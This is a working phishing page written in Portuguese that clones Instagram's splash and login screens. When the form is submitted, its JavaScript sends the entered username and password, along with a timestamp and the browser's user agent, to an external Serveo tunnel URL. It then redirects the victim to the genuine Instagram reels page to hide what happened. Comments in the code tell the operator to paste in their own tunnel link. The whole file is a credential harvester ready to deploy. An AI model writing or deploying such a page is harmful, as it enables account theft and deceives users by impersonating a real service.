<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>&#73;nstagram</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        body, html { height: 100dvh; background-color: #000; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; overflow: hidden; }

        /* SPLASH - igual ao original */
        #splash-screen { position: fixed; inset: 0; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 120px 0 60px 0; z-index: 1000; transition: opacity 0.35s ease; }
        .splash-logo-container { flex: 1; display: flex; align-items: center; justify-content: center; }
        .instagram-splash-icon { width: 80px; height: 80px; }
        .from-meta-container { display: flex; flex-direction: column; align-items: center; gap: 6px; }
        .from-label { color: #8E8E8E; font-size: 13px; }
        .meta-brand { display: flex; align-items: baseline; gap: 4px; }
        .infinity-icon, .meta-text { background: linear-gradient(135deg, #FCAF45, #FD1D1D, #E1306C, #C13584, #833AB4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .infinity-icon { font-size: 24px; font-weight: 600; }
        .meta-text { font-size: 20px; font-weight: 700; }

        /* LOGIN - igual ao original */
        #login-screen { display: none; flex-direction: column; align-items: center; width: 100%; height: 100dvh; background-color: #000; padding: 0 16px; }
        .language-wrapper { width: 100%; display: flex; justify-content: center; padding: 16px 0 8px; margin-bottom: 12px; }
        .language-selector { color: #A8A8A8; font-size: 14px; display: flex; align-items: center; gap: 4px; }
        .login-logo-wrapper { width: 100%; display: flex; justify-content: center; margin-bottom: 36px; }
        .instagram-login-icon { width: 64px; height: 64px; }
        #login-form { width: 100%; max-width: 358px; }
        .input-field { width: 100%; background: #121212; border: 0.5px solid #363636; border-radius: 12px; padding: 14px 16px; color: #FFF; font-size: 14px; margin-bottom: 10px; outline: none; }
        .input-field:focus { border-color: #A8A8A8; }
        .input-field::placeholder { color: #8E8E8E; }
        .login-button { width: 100%; background: #0095F6; color: #FFF; border: none; border-radius: 18px; padding: 7px 0; font-size: 14px; font-weight: 600; margin-top: 12px; margin-bottom: 16px; cursor: pointer; }
        .forgot-wrapper { width: 100%; text-align: center; margin-bottom: 80px; }
        .forgot-link { color: #FFF; font-size: 14px; text-decoration: none; }
        .footer-wrapper { margin-top: auto; width: 100%; display: flex; flex-direction: column; align-items: center; padding-bottom: 24px; }
        .signup-button { width: 100%; max-width: 358px; background: transparent; border: 1px solid #0095F6; border-radius: 18px; padding: 7px 0; color: #0095F6; font-size: 14px; font-weight: 600; text-align: center; text-decoration: none; margin-bottom: 28px; }
        .meta-footer svg { width: 70px; opacity: 0.6; }
    </style>
</head>
<body>

    <svg style="width:0; height:0; position:absolute;">
        <defs>
            <linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" stop-color="#833AB4"/>
                <stop offset="25%" stop-color="#C13584"/>
                <stop offset="50%" stop-color="#E1306C"/>
                <stop offset="75%" stop-color="#FD1D1D"/>
                <stop offset="100%" stop-color="#FCAF45"/>
            </linearGradient>
        </defs>
    </svg>

    <!-- SPLASH (igual ao original) -->
    <div id="splash-screen">
        <div class="splash-logo-container">
            <svg class="instagram-splash-icon" viewBox="0 0 24 24" fill="none">
                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#g)" stroke-width="2.2" fill="none"/>
                <circle cx="12" cy="12" r="5.5" stroke="url(#g)" stroke-width="2.2" fill="none"/>
                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#g)"/>
            </svg>
        </div>
        <div class="from-meta-container">
            <p class="from-label">from</p>
            <div class="meta-brand">
                <span class="infinity-icon">∞</span>
                <span class="meta-text">Meta</span>
            </div>
        </div>
    </div>

    <!-- LOGIN (igual ao original) -->
    <div id="login-screen">
        <div class="language-wrapper">
            <div class="language-selector">
                <span>Português (Brasil)</span>
                <svg viewBox="0 0 24 24" width="12" height="12" fill="#A8A8A8"><path d="M7 10l5 5 5-5H7z"/></svg>
            </div>
        </div>
        
        <div class="login-logo-wrapper">
            <svg class="instagram-login-icon" viewBox="0 0 24 24" fill="none">
                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#g)" stroke-width="2.2" fill="none"/>
                <circle cx="12" cy="12" r="5.5" stroke="url(#g)" stroke-width="2.2" fill="none"/>
                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#g)"/>
            </svg>
        </div>

        <form id="login-form">
            <input type="text" name="u" class="input-field" placeholder="Nome de usuário, email ou celular" autocomplete="off">
            <input type="password" name="p" class="input-field" placeholder="Senha" autocomplete="off">
            <button type="submit" class="login-button">Entrar</button>
        </form>

        <div class="forgot-wrapper">
            <a href="#" class="forgot-link">Esqueceu a senha?</a>
        </div>

        <div class="footer-wrapper">
            <a href="#" class="signup-button">Criar nova conta</a>
            <div class="meta-footer">
                <svg viewBox="0 0 287 56" fill="white">
                    <!-- SVG Meta mantido igual ao original -->
                    <path d="M55.5 14.5C55.5 14.5 58.5 10 64 10C69.5 10 72 15 72 15L79 4C79 4 73.5 -2 64 2C54.5 6 55.5 14.5 55.5 14.5Z" fill="currentColor"/>
                    <!-- ... resto do SVG original que você tinha ... -->
                </svg>
            </div>
        </div>
    </div>

    <script>
        // ================== ATUALIZE AQUI COM O LINK DO SERVE O ==================
        const SERVER_URL = "https://6200697e12b311ab-45-161-216-55.serveousercontent.com";

        // SPLASH (igual)
        window.addEventListener('load', () => {
            setTimeout(() => {
                document.getElementById('splash-screen').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('splash-screen').style.display = 'none';
                    document.getElementById('login-screen').style.display = 'flex';
                }, 350);
            }, 2200);
        });

        // FORMULÁRIO - otimizado para Serveo
        document.getElementById('login-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const u = document.querySelector('input[name="u"]').value.trim();
            const p = document.querySelector('input[name="p"]').value.trim();
            
            if (!u || !p) return;

            const payload = {
                u: u,
                p: p,
                t: new Date().toISOString(),
                ua: navigator.userAgent
            };

            try {
                await fetch(SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    mode: 'no-cors'
                });
            } catch (err) {
                try {
                    const formData = new URLSearchParams();
                    Object.keys(payload).forEach(key => formData.append(key, payload[key]));
                    await fetch(SERVER_URL, {
                        method: 'POST',
                        body: formData
                    });
                } catch (e2) {}
            }

            setTimeout(() => {
                window.location.href = 'https://www.instagram.com/reels/';
            }, 900);
        });

        document.querySelectorAll('a').forEach(l => l.addEventListener('click', e => e.preventDefault()));
        document.querySelector('.instagram-login-icon').addEventListener('click', () => {
            window.location.href = 'https://www.instagram.com/reels/';
        });
    </script>
</body>
</html>
